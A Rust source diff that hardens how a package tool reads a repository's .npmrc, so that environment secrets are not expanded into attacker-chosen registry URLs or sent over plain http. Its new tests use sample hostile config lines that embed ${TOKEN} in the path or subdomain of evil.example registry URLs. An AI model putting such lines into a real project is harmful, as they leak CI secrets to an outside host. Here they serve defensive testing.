@@ -2,14 +2,17 @@
 //!
 //! Read: `registry`, `@scope:registry` and `//host/path/:_authToken`, from `npm_config_registry` in the environment,
 //! the project's `.npmrc` and the user's `.npmrc` (`NPM_CONFIG_USERCONFIG`, else `~/.npmrc`), in that order of
-//! precedence. `${VAR}` in a value is replaced from the environment. Nothing else in `.npmrc` is read: no `_auth`,
+//! precedence. `${VAR}` in a value of the user's `.npmrc` is replaced from the environment. Nothing else in `.npmrc` is
+//! read: no `_auth`,
 //! username or password, client certificate or `strict-ssl`. A token is only ever sent in the `Authorization` header
 //! of a request to the registry it is configured for, and never printed.
 //!
-//! The project's `.npmrc` comes with the repository, so whoever writes it chooses the host. A `${VAR}` in one of its
-//! `_authToken` values would send that CI secret to the host, so it is expanded only for a host the user already
-//! trusts: `registry.npmjs.org`, or a host of the user's `.npmrc` or of `npm_config_registry`. Any other such token is
-//! dropped with a warning that names the host.
+//! The project's `.npmrc` comes with the repository, so whoever writes it chooses the hosts and URLs. A `${VAR}` in
+//! one of its values would send that CI secret wherever the file says: in a registry URL's path or host name (and so
+//! to DNS), or as the token of a host it picks. So the project's file expands `${VAR}` only in the `_authToken` of a
+//! host the user already trusts (`registry.npmjs.org`, or a host of the user's `.npmrc` or of `npm_config_registry`),
+//! and only when the file does not point that host at plain `http://`. Any other line of it that reads a variable is
+//! skipped with a warning naming its key or host, never its value.
 
 use std::collections::BTreeMap;
 use std::path::{Path, PathBuf};
@@ -90,18 +93,21 @@ fn host_of(url: &str) -> Option<String> {
 impl Npmrc {
     /// Reads the settings of one `.npmrc` text that the user wrote: every `${VAR}` is expanded.
     pub fn parse(text: &str, var: &dyn Fn(&str) -> Option<String>) -> Self {
-        Self::parse_with(text, var, &|_| true, &mut Vec::new())
+        Self::parse_with(text, var, None, &mut Vec::new())
     }
 
-    /// Reads the settings of one `.npmrc` text. A token that uses `${VAR}` is kept only when `trusted` accepts its
-    /// host; otherwise a warning naming the host is added to `warnings`.
+    /// Reads the settings of one `.npmrc` text. With `trusted` (the project's file), no `${VAR}` is expanded except
+    /// in the `_authToken` of a host `trusted` accepts, and only when the file does not point that host at plain
+    /// `http://`; every other line that reads a variable is skipped with a warning in `warnings` that names its key
+    /// or host, never the value.
     fn parse_with(
         text: &str,
         var: &dyn Fn(&str) -> Option<String>,
-        trusted: &dyn Fn(&str) -> bool,
+        trusted: Option<&dyn Fn(&str) -> bool>,
         warnings: &mut Vec<String>,
     ) -> Self {
         let mut npmrc = Self::default();
+        let mut tokens = Vec::new();
         for line in text.lines() {
             let line = line.trim();
             if line.is_empty() || line.starts_with(['#', ';']) {
@@ -113,21 +119,15 @@ impl Npmrc {
             let key = key.trim();
             let raw = unquoted(raw);
             if let Some(dart) = key.strip_suffix(":_authToken").filter(|dart| dart.starts_with("//")) {
-                let mut dart = dart.to_owned();
-                if !dart.ends_with('/') {
-                    dart.push('/');
-                }
-                let host = host_of(&dart).unwrap_or_default();
-                if raw.contains("${") && !trusted(&host) {
-                    warnings.push(format!(
-                        "ignoring the _authToken for {host} in the project .npmrc: it reads an environment variable, \
-                         and {host} is not {DEFAULT_HOST} or a host of the user .npmrc or npm_config_registry"
-                    ));
-                    continue;
-                }
-                if let Some(value) = expand(raw, var).filter(|value| !value.is_empty()) {
-                    npmrc.tokens.insert(dart, value);
-                }
+                // Tokens wait for the registries, which may come later in the file.
+                tokens.push((dart, raw));
+                continue;
+            }
+            if trusted.is_some() && raw.contains("${") {
+                warnings.push(format!(
+                    "ignoring `{key}` in the project .npmrc: it reads an environment variable, which only the user \
+                     .npmrc and the _authToken of a trusted host may do"
+                ));
                 continue;
             }
             let Some(value) = expand(raw, var) else {
@@ -139,6 +139,42 @@ impl Npmrc {
                 && let Some(url) = normalized(&value)
             {
                 npmrc.scopes.insert(scope.to_owned(), url);
+            }
+        }
+        // The hosts this file sends to over plain http: a token read from the environment never goes there.
+        let plain: std::collections::BTreeSet<String> = npmrc
+            .registry
+            .iter()
+            .chain(npmrc.scopes.values())
+            .filter(|url| url.starts_with("http://"))
+            .filter_map(|url| host_of(url))
+            .collect();
+        for (dart, raw) in tokens {
+            let mut dart = dart.to_owned();
+            if !dart.ends_with('/') {
+                dart.push('/');
+            }
+            let host = host_of(&dart).unwrap_or_default();
+            if let Some(trusted) = trusted
+                && raw.contains("${")
+            {
+                if !trusted(&host) {
+                    warnings.push(format!(
+                        "ignoring the _authToken for {host} in the project .npmrc: it reads an environment variable, \
+                         and {host} is not {DEFAULT_HOST} or a host of the user .npmrc or npm_config_registry"
+                    ));
+                    continue;
+                }
+                if plain.contains(&host) {
+                    warnings.push(format!(
+                        "ignoring the _authToken for {host} in the project .npmrc: it reads an environment variable, \
+                         and the project .npmrc sets an http:// registry for {host}"
+                    ));
+                    continue;
+                }
+            }
+            if let Some(value) = expand(raw, var).filter(|value| !value.is_empty()) {
+                npmrc.tokens.insert(dart, value);
             }
         }
         npmrc
@@ -208,7 +244,7 @@ impl Npmrc {
         let mut trusted = environment.hosts();
         trusted.extend(user.hosts());
         trusted.insert(DEFAULT_HOST.to_owned());
-        Self::parse_with(text, var, &|host| trusted.contains(host), warnings)
+        Self::parse_with(text, var, Some(&|host| trusted.contains(host)), warnings)
     }
 
     /// The registry `name` is fetched from, with a trailing slash.
@@ -340,6 +376,55 @@ mod tests {
             Some("s3cret"),
             "the user's own file keeps full expansion"
         );
+    }
+
+    #[test]
+    fn a_project_registry_never_reads_the_environment() {
+        let text = "registry=https://evil.example/${TOKEN}\n@acme:registry=https://${TOKEN}.evil.example/\nother-key=${TOKEN}\n";
+        let mut warnings = Vec::new();
+        let project = Npmrc::project(text, &env, &Npmrc::default(), &Npmrc::default(), &mut warnings);
+        assert_eq!(project.registry_for("react"), DEFAULT_REGISTRY);
+        assert_eq!(project.registry_for("@acme/ui"), DEFAULT_REGISTRY);
+        assert_eq!(warnings.len(), 3, "{warnings:?}");
+        for (warning, key) in warnings.iter().zip(["registry", "@acme:registry", "other-key"]) {
+            assert!(warning.contains(&format!("`{key}`")), "{warning}");
+            assert!(!warning.contains("s3cret") && !warning.contains("TOKEN"), "{warning}");
+        }
+
+        let user = Npmrc::parse(text, &env);
+        assert_eq!(
+            user.registry_for("react"),
+            "https://evil.example/s3cret/",
+            "the user's own file keeps full expansion"
+        );
+    }
+
+    #[test]
+    fn a_project_token_from_the_environment_never_goes_over_http() {
+        let text = "registry=http://registry.npmjs.org/\n//registry.npmjs.org/:_authToken=${TOKEN}\n@acme:registry=http://npm.acme.dev/\n//npm.acme.dev/:_authToken=literal\n";
+        let user = Npmrc::parse("@acme:registry=https://npm.acme.dev/\n", &env);
+        let mut warnings = Vec::new();
+        let project = Npmrc::project(text, &env, &Npmrc::default(), &user, &mut warnings);
+        assert_eq!(project.token_for("http://registry.npmjs.org/"), None);
+        assert_eq!(
+            project.token_for("http://npm.acme.dev/"),
+            Some("literal"),
+            "a literal token reads nothing"
+        );
+        assert_eq!(warnings.len(), 1, "{warnings:?}");
+        assert!(warnings[0].contains("registry.npmjs.org") && warnings[0].contains("http://"));
+        assert!(!warnings[0].contains("s3cret"));
+
+        let mut warnings = Vec::new();
+        let https = Npmrc::project(
+            "//registry.npmjs.org/:_authToken=${TOKEN}\nregistry=https://registry.npmjs.org/\n",
+            &env,
+            &Npmrc::default(),
+            &Npmrc::default(),
+            &mut warnings,
+        );
+        assert_eq!(https.token_for("https://registry.npmjs.org/"), Some("s3cret"));
+        assert!(warnings.is_empty(), "{warnings:?}");
     }
 
     #[test]
